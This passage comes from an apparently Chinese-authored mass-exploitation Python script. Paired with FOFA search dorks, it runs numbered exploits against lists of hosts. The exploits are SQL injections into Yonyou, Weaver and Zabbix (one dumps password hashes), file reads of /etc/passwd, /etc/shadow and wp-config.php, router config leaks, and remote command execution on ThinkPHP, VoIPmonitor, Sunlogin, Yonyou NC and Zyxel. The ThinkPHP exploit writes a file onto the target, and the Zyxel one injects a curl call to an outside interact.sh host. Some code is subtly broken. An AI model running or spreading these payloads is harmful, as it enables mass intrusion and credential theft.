    data = r"""mode=151&json={"username"%3a"admin","password"%3a"somethingnotpassword","languageid"%3a"1","browser"%3a"Chrome_101","accessaction"%3a1,+"mode\u0000"%3a716}&__RequestType=ajax&t=1653896534066"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.post(url, data=data,verify=False,timeout=3)
            if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
                with open ("存在用友 U8 OA test.jsp SQL注入漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 38、Tenda W15E企业级路由器配置文件泄漏漏洞一把梭 fofa:title=="Tenda | Login"
def Tenda_W15E_config_leak_exp(dic):
    poc = r"""/cgi-bin/DownloadCfg/RouterCfm.cfg"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "sys.userpass" in res.text:
                with open ("存在Tenda W15E企业级路由器配置文件泄漏漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 39、Thinkphp 5.0.x通杀gethell一把梭 fofa:header="thinkphp"
def Thinkphp_5_0_x_gethell_exp(dic):
    poc1 = "/public/index.php?s=captcha"
    poc2 = "/public/11.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "_method": "__construct",
        "filter[]": "system",
        "method": "get",
        "server[REQUEST_METHOD]": "echo 202cb962ac59075b964b07152d234b70 > 11.php"
    }
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list
        else:
            url = 'http://'+ url_list
        try:
            target = url + poc1
            r = requests.post(target, data=data, headers=headers)
            rs = requests.get(url+poc2)
            if rs.status_code == 200 and "202cb962ac59075b964b07152d234b70" in rs.text:
                pocurl = url + poc2
                with open ("存在Thinkphp 5.0.x通杀gethell漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 40、VoIPmonitor 远程命令执行漏洞(CVE-2021-30461)一把梭 fofa:"VoIPmonitor"
def VoIPmonitor_RCE_CVE_2021_30461_exp(dic):
    poc = r"""/index.php"""
    data = "SPOOLDIR=test%22.system%28id%29.%22&recheck=annen"
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.post(url, data=data,verify=False,timeout=3)
            if "groups=" in res.text:
                with open ("存在VoIPmonitor 远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 41、昆石网络 虚拟运营支撑系统任意文件读取漏洞一把梭 fofa:app="VOS-VOS3000"
def VOS3000_redfile_exp(dic):
    poc = r"""/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False, timeout=3)
            if "root" in res.text:
                with open ("存在昆石网络 虚拟运营支撑系统任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 42、泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞一把梭 fofa:app="泛微-协同办公OA"
def Weaver_HrmCareerApplyPerView_sql_exp(dic):
    poc = r"""/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "0x900150983cd24fb0d6963f7d28e17f72" in res.text:
                with open ("存在泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 43、WordPress任意文件读取漏洞(CVE-2022-1119)一把梭 
def wordpress_any_file_read_CVE_2022_1119_exp(dic):
    poc = r"""/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "?php" in res.text:
                with open ("存在WordPress任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 44、小米 路由器 extdisks 任意文件读取漏洞(CVE-2019-18371)一把梭 fofa:app="小米路由器"
def xiaomi_wifi_anyfile_read_cve_2019_18371_exp(dic):
    poc = r"""/api-third-party/download/extdisks../etc/shadow"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "root" in res.text:
                with open ("存在小米 路由器 extdisks 任意文件读取漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 45、向日葵RCE一把梭
def xrk_rce(dic):
    for url_list in dic:
        if ('http://' in url_list):
            address = str(url_list).replace('http://','')
        elif ('https://' in url_list):
            address = str(url_list).replace('https://','')
        else:
            address = url_list
        try:
            command = "ipconfig"
            url = 'http://%s/cgi-bin/rpc?action=verify-haras' % address
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
            }
            res_cid = requests.get(url)
            cid = re.findall('"verify_string":"(.*?)",', res_cid.text)
            payload = "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20"
            url = "http://" + address + payload
            data = {
                'Host': address,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Accept-Encoding': 'gzip, defla te',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': 'CID=%s' % cid[0],
                'Cache-Control': 'max-age=0'
            }
            res = requests.get(url, headers=data, timeout=10)
            if "Windows IP" in res.text:
                with open ("存在向日葵RCE一把梭漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 46、用友 NC bsh.servlet.BshServlet 远程命令执行漏洞一把梭
def yync_bsh_servlet_BshServletexp(dic):
    poc = r"""/servlet//~ic/bsh.servlet.BshServlet"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, timeout=3)
            if "BeanShell" in res.text:
                with open ("存在用友 NC bsh.servlet.BshServlet 远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 47、用友 U8 OA test.jsp SQL注入漏洞一把梭
def yyu8_testsql_sql_exp(dic):
    poc = r"""/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"""
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, verify=False,timeout=3)
            if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
                with open ("存在用友 NC bsh.servlet.BshServlet 远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 48、zabbix 身份认证错误 fofa:app="ZABBIX-监控系统" && body="saml"
def zabbix_auth_exp(dic):
    zabbix_text = "Zabbix"
    poc = "/zabbix"
    payload = "\x2f\x7a\x61\x62\x62\x69\x78\x2e\x70\x68\x70\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x2e\x76\x69\x65\x77\x26\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x69\x64\x3d\x31"
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        headers = {
            "User-Agent": "Opera/9.61 (Macintosh; Intel Mac OS X; U; de) Presto/2.1.1",
            "Referer": url,
            "Content-Type": "application/x-www-form-urlencoded"
        }
        url_payload = f"{url}{payload}"
        try:
            path_request = requests.get(url, verify=False, timeout=5)
            path_content = path_request.text
            if (zabbix_text in path_content):
                payload_request = requests.get(url_payload, headers=headers, verify=False, timeout=10)
                if payload_request.status_code == 200:
                    if 'Global view' in payload_request.text:
                        with open ("存在zabbix 身份认证错误漏洞的url.txt", 'a+',encoding='utf-8') as f:
                            print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                            f.write(url + "\n")
                            f.close()
                    else:
                        print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 49、Zabbix—SQL注入 漏洞一把梭 fofa:ZABBIX-监控系统
def zabbix_sql_exp(dic):
    poc = r"""popup.php?dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=1))%20union%20select%201,group_concat(surname,0x2f,passwd)%20from%20users%23"""
    status_str = ['Administrator', 'User']
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            target_url = url_list
            url = url_list + poc
        else:
            target_url = 'http://' + url_list
            url = 'http://'+ url_list + poc
        try:
            res = requests.get(url, Verify=False,timeout=3)
            if res.status_code == 200:
                target_url_payload = f"{target_url}"
                res = requests.get(url=target_url_payload,Verify=False)
                if res.status_code == 200:
                    for i in range(len(status_str)):
                        if status_str[i] in res.text:
                            with open ("存在Zabbix—SQL注入漏洞的url.txt", 'a+',encoding='utf-8') as f:
                                print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                                f.write(url + "\n")
                                f.close()
                else:
                    target_url = url + '/zabbix/' + poc
                    res = requests.get(url=target_url,verify=False)
                    for i in range(len(status_str)):
                        if status_str[i] in res.text:
                            with open ("存在Zabbix—SQL注入漏洞的url.txt", 'a+',encoding='utf-8') as f:
                                print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                                f.write(url + "\n")
                                f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")

# 50、Zyxel USG FLEX handler 远程命令执行漏洞(CVE-2022-30525)一把梭
def Zyxel_rce_CVE_2022_30525_exp(dic):
    poc = r"""/ztp/cgi-bin/handler"""
    data = {"command": "setWanPortSt", "proto": "dhcp", "port": "4", "vlan_tagged": "1", "vlanid": "5",
            "mtu": ";curl `id`.c9y7h342vtc00002dwxggr9tukwyyyyyj.interact.sh;", "data": "hi"}
    headers = {
        "Content-Type": "application/json"
    }
    for url_list in dic:
        if ('http://' in url_list) or ('https://' in url_list):
            url = url_list + poc
        else:
            url = 'http://'+ url_list + poc
        try:
            res = requests.post(url, headers=headers,data=data,verify=False,timeout=3)
            if "groups=" in res.text:
                with open ("存在Zyxel USG FLEX handler 远程命令执行漏洞的url.txt", 'a+',encoding='utf-8') as f:
                        print("[+]---------小伙子运气杠杠的，喜提可用漏洞+1：" + url)
                        f.write(url + "\n")
                        f.close()
            else:
                print("[-]---------下一个更精彩：" + url)
        except Exception as err:
            print("[-]目标请求失败，报错内容：" + str(err) + "\n")